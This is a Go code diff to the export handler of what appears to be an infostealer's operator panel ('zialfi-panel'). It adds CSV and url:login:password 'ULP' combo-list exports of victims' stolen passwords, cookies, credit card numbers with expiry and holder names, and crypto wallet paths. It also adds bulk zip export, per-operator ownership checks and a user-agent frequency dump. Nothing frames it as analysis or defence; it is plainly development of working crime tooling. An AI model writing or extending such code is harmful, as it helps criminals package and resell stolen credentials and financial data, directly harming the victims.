@@ -4,10 +4,14 @@ import (
 	"archive/zip"
 	"bytes"
 	"database/sql"
+	"encoding/csv"
 	"encoding/json"
 	"net/http"
+	"sort"
+	"strings"
 
 	"github.com/go-chi/chi/v5"
+	"zialfi-panel/internal/db"
 )
 
 type ExportHandler struct {
@@ -21,7 +25,8 @@ func NewExportHandler(db *sql.DB) *ExportHandler {
 func (h *ExportHandler) ExportSession(w http.ResponseWriter, r *http.Request) {
 	id := chi.URLParam(r, "id")
 
-	if r.URL.Query().Get("format") == "netscape" {
+	format := r.URL.Query().Get("format")
+	if format == "netscape" {
 		h.exportNetscape(w, r)
 		return
 	}
@@ -32,9 +37,9 @@ func (h *ExportHandler) ExportSession(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Check session lock — hide sensitive data if locked by another
+	// Check session lock - hide sensitive data if locked by another
 	var lockedBy string
-	locked := h.db.QueryRow("SELECT locked_by FROM session_locks WHERE session_id = ?", id).Scan(&lockedBy) == nil
+	locked := db.QueryRow(h.db, "SELECT locked_by FROM session_locks WHERE session_id = ?", id).Scan(&lockedBy) == nil
 	if locked && lockedBy != claims.UserID && claims.Role != "admin" {
 		writeError(w, http.StatusForbidden, "session is locked by another user")
 		return
@@ -57,7 +62,7 @@ func (h *ExportHandler) ExportSession(w http.ResponseWriter, r *http.Request) {
 		CountryCode string
 		CreatedAt   string
 	}
-	err := h.db.QueryRow(`
+	err := db.QueryRow(h.db, `
 		SELECT id, build_id, hwid, os, username, ip, country_code, created_at
 		FROM sessions WHERE id = ?`, id).Scan(
 		&s.ID, &s.BuildID, &s.Hwid, &s.Os, &s.Username,
@@ -72,11 +77,29 @@ func (h *ExportHandler) ExportSession(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	if !sessionOwnedBy(h.db, r, id) {
+		writeError(w, http.StatusForbidden, "access denied")
+		return
+	}
+
 	passwords := queryPasswords(h.db, id)
 	if !reveal {
 		for i := range passwords {
 			passwords[i].PasswordValue = "[MASKED]"
 		}
+	}
+
+	cookies := queryCookies(h.db, id)
+	cards := queryCards(h.db, id)
+	wallets := queryWalletsWithIcons(h.db, id)
+
+	if format == "csv" {
+		h.exportCSV(w, id, passwords, cookies, cards, wallets)
+		return
+	}
+	if format == "ulp" {
+		h.exportULP(w, id, passwords)
+		return
 	}
 
 	resp := SessionDetailResponse{
@@ -89,14 +112,57 @@ func (h *ExportHandler) ExportSession(w http.ResponseWriter, r *http.Request) {
 		CountryCode: s.CountryCode,
 		CreatedAt:   s.CreatedAt,
 		Passwords:   passwords,
-		Cookies:     queryCookies(h.db, id),
-		Cards:       queryCards(h.db, id),
-		Wallets:     queryWalletsWithIcons(h.db, id),
+		Cookies:     cookies,
+		Cards:       cards,
+		Wallets:     wallets,
 		Files:       queryFiles(h.db, id),
 		SystemInfo:  querySystemInfo(h.db, id),
 	}
 
 	writeJSON(w, http.StatusOK, resp)
+}
+
+func (h *ExportHandler) exportCSV(w http.ResponseWriter, sessionID string, passwords []db.Password, cookies []db.Cookie, cards []db.Card, wallets []db.WalletResponse) {
+	w.Header().Set("Content-Type", "text/csv")
+	w.Header().Set("Content-Disposition", "attachment; filename=session_"+sessionID+".csv")
+
+	cw := csv.NewWriter(w)
+	cw.Write([]string{"type", "url", "username", "password", "domain", "cookie_name", "cookie_value", "card_number", "card_expiry", "card_holder", "wallet_name", "wallet_path"})
+
+	for _, p := range passwords {
+		cw.Write([]string{"password", p.Url, p.Username, p.PasswordValue, "", "", "", "", "", "", "", ""})
+	}
+	for _, c := range cookies {
+		cw.Write([]string{"cookie", "", "", "", c.Domain, c.Name, c.Value, "", "", "", "", ""})
+	}
+	for _, c := range cards {
+		expiry := ""
+		if c.ExpMonth != "" || c.ExpYear != "" {
+			expiry = c.ExpMonth + "/" + c.ExpYear
+		}
+		cw.Write([]string{"card", "", "", "", "", "", "", c.Number, expiry, c.Holder, "", ""})
+	}
+	for _, w2 := range wallets {
+		cw.Write([]string{"wallet", "", "", "", "", "", "", "", "", "", w2.Name, w2.Path})
+	}
+
+	cw.Flush()
+}
+
+func (h *ExportHandler) exportULP(w http.ResponseWriter, sessionID string, passwords []db.Password) {
+	w.Header().Set("Content-Type", "text/plain")
+	w.Header().Set("Content-Disposition", "attachment; filename=session_"+sessionID+".ulp.txt")
+
+	var b strings.Builder
+	for _, p := range passwords {
+		b.WriteString(p.Url)
+		b.WriteByte(':')
+		b.WriteString(p.Username)
+		b.WriteByte(':')
+		b.WriteString(p.PasswordValue)
+		b.WriteByte('\n')
+	}
+	w.Write([]byte(b.String()))
 }
 
 func (h *ExportHandler) exportNetscape(w http.ResponseWriter, r *http.Request) {
@@ -109,16 +175,21 @@ func (h *ExportHandler) exportNetscape(w http.ResponseWriter, r *http.Request) {
 	}
 
 	var lockedBy string
-	locked := h.db.QueryRow("SELECT locked_by FROM session_locks WHERE session_id = ?", sessionID).Scan(&lockedBy) == nil
+	locked := db.QueryRow(h.db, "SELECT locked_by FROM session_locks WHERE session_id = ?", sessionID).Scan(&lockedBy) == nil
 	if locked && lockedBy != claims.UserID && claims.Role != "admin" {
 		writeError(w, http.StatusForbidden, "session is locked by another user")
 		return
 	}
 
 	var exists bool
-	err := h.db.QueryRow("SELECT EXISTS(SELECT 1 FROM sessions WHERE id = ?)", sessionID).Scan(&exists)
+	err := db.QueryRow(h.db, "SELECT EXISTS(SELECT 1 FROM sessions WHERE id = ?)", sessionID).Scan(&exists)
 	if err != nil || !exists {
 		writeError(w, http.StatusNotFound, "session not found")
+		return
+	}
+
+	if !sessionOwnedBy(h.db, r, sessionID) {
+		writeError(w, http.StatusForbidden, "access denied")
 		return
 	}
 
@@ -171,57 +242,116 @@ func (h *ExportHandler) ExportBulk(w http.ResponseWriter, r *http.Request) {
 		writeError(w, http.StatusBadRequest, "ids required")
 		return
 	}
+	if len(req.IDs) > 1000 {
+		writeError(w, http.StatusBadRequest, "too many session ids (max 1000)")
+		return
+	}
+
+	format := r.URL.Query().Get("format")
+	ext := ".json"
+	if format == "csv" {
+		ext = ".csv"
+	} else if format == "ulp" {
+		ext = ".ulp.txt"
+	}
 
 	var buf bytes.Buffer
 	zw := zip.NewWriter(&buf)
 
 	for _, id := range req.IDs {
+		if !sessionOwnedBy(h.db, r, id) {
+			continue
+		}
+
 		var lockedBy string
-		locked := h.db.QueryRow("SELECT locked_by FROM session_locks WHERE session_id = ?", id).Scan(&lockedBy) == nil
+		locked := db.QueryRow(h.db, "SELECT locked_by FROM session_locks WHERE session_id = ?", id).Scan(&lockedBy) == nil
 		if locked && lockedBy != claims.UserID && claims.Role != "admin" {
 			continue
 		}
 
-		resp := SessionDetailResponse{
-			Passwords:  queryPasswords(h.db, id),
-			Cookies:    queryCookies(h.db, id),
-			Cards:      queryCards(h.db, id),
-			Wallets:    queryWalletsWithIcons(h.db, id),
-			Files:      queryFiles(h.db, id),
-			SystemInfo: querySystemInfo(h.db, id),
+		passwords := queryPasswords(h.db, id)
+		cookies := queryCookies(h.db, id)
+		cards := queryCards(h.db, id)
+		wallets := queryWalletsWithIcons(h.db, id)
+
+		var content []byte
+		var err error
+
+		switch format {
+		case "csv":
+			var csvBuf bytes.Buffer
+			cw := csv.NewWriter(&csvBuf)
+			cw.Write([]string{"type", "url", "username", "password", "domain", "cookie_name", "cookie_value", "card_number", "card_expiry", "card_holder", "wallet_name", "wallet_path"})
+			for _, p := range passwords {
+				cw.Write([]string{"password", p.Url, p.Username, p.PasswordValue, "", "", "", "", "", "", "", ""})
+			}
+			for _, c := range cookies {
+				cw.Write([]string{"cookie", "", "", "", c.Domain, c.Name, c.Value, "", "", "", "", ""})
+			}
+			for _, c := range cards {
+				expiry := ""
+				if c.ExpMonth != "" || c.ExpYear != "" {
+					expiry = c.ExpMonth + "/" + c.ExpYear
+				}
+				cw.Write([]string{"card", "", "", "", "", "", "", c.Number, expiry, c.Holder, "", ""})
+			}
+			for _, w := range wallets {
+				cw.Write([]string{"wallet", "", "", "", "", "", "", "", "", "", w.Name, w.Path})
+			}
+			cw.Flush()
+			content = csvBuf.Bytes()
+		case "ulp":
+			var b strings.Builder
+			for _, p := range passwords {
+				b.WriteString(p.Url)
+				b.WriteByte(':')
+				b.WriteString(p.Username)
+				b.WriteByte(':')
+				b.WriteString(p.PasswordValue)
+				b.WriteByte('\n')
+			}
+			content = []byte(b.String())
+		default:
+			resp := SessionDetailResponse{
+				Passwords:  passwords,
+				Cookies:    cookies,
+				Cards:      cards,
+				Wallets:    wallets,
+				Files:      queryFiles(h.db, id),
+				SystemInfo: querySystemInfo(h.db, id),
+			}
+
+			var s struct {
+				ID, BuildID, Hwid, Os, Username, Ip, CountryCode, CreatedAt string
+			}
+			err = db.QueryRow(h.db, `
+				SELECT id, build_id, hwid, os, username, ip, country_code, created_at
+				FROM sessions WHERE id = ?`, id).Scan(
+				&s.ID, &s.BuildID, &s.Hwid, &s.Os, &s.Username,
+				&s.Ip, &s.CountryCode, &s.CreatedAt,
+			)
+			if err != nil {
+				continue
+			}
+			resp.ID = s.ID
+			resp.BuildID = s.BuildID
+			resp.Hwid = s.Hwid
+			resp.Os = s.Os
+			resp.Username = s.Username
+			resp.Ip = s.Ip
+			resp.CountryCode = s.CountryCode
+			resp.CreatedAt = s.CreatedAt
+			content, err = json.Marshal(resp)
+			if err != nil {
+				continue
+			}
 		}
 
-		var s struct {
-			ID, BuildID, Hwid, Os, Username, Ip, CountryCode, CreatedAt string
-		}
-		err := h.db.QueryRow(`
-			SELECT id, build_id, hwid, os, username, ip, country_code, created_at
-			FROM sessions WHERE id = ?`, id).Scan(
-			&s.ID, &s.BuildID, &s.Hwid, &s.Os, &s.Username,
-			&s.Ip, &s.CountryCode, &s.CreatedAt,
-		)
+		f, err := zw.Create(id + ext)
 		if err != nil {
 			continue
 		}
-		resp.ID = s.ID
-		resp.BuildID = s.BuildID
-		resp.Hwid = s.Hwid
-		resp.Os = s.Os
-		resp.Username = s.Username
-		resp.Ip = s.Ip
-		resp.CountryCode = s.CountryCode
-		resp.CreatedAt = s.CreatedAt
-
-		data, err := json.Marshal(resp)
-		if err != nil {
-			continue
-		}
-
-		f, err := zw.Create(id + ".json")
-		if err != nil {
-			continue
-		}
-		if _, err := f.Write(data); err != nil {
+		if _, err := f.Write(content); err != nil {
 			continue
 		}
 	}
@@ -232,4 +362,35 @@ func (h *ExportHandler) ExportBulk(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Disposition", "attachment; filename=export.zip")
 	w.WriteHeader(http.StatusOK)
 	w.Write(buf.Bytes())
+}
+
+func (h *ExportHandler) ExportUserAgents(w http.ResponseWriter, r *http.Request) {
+	rows, err := db.Query(h.db, "SELECT user_agent FROM system_info WHERE user_agent IS NOT NULL AND user_agent != ''")
+	if err != nil {
+		writeError(w, http.StatusInternalServerError, "failed to query user agents")
+		return
+	}
+	defer rows.Close()
+
+	counts := make(map[string]int)
+	for rows.Next() {
+		var ua string
+		if rows.Scan(&ua) == nil && ua != "" {
+			counts[ua]++
+		}
+	}
+
+	type uaEntry struct {
+		UserAgent string `json:"user_agent"`
+		Count     int    `json:"count"`
+	}
+	var result []uaEntry
+	for ua, count := range counts {
+		result = append(result, uaEntry{UserAgent: ua, Count: count})
+	}
+	sort.Slice(result, func(i, j int) bool {
+		return result[i].Count > result[j].Count
+	})
+
+	writeJSON(w, http.StatusOK, result)
 }
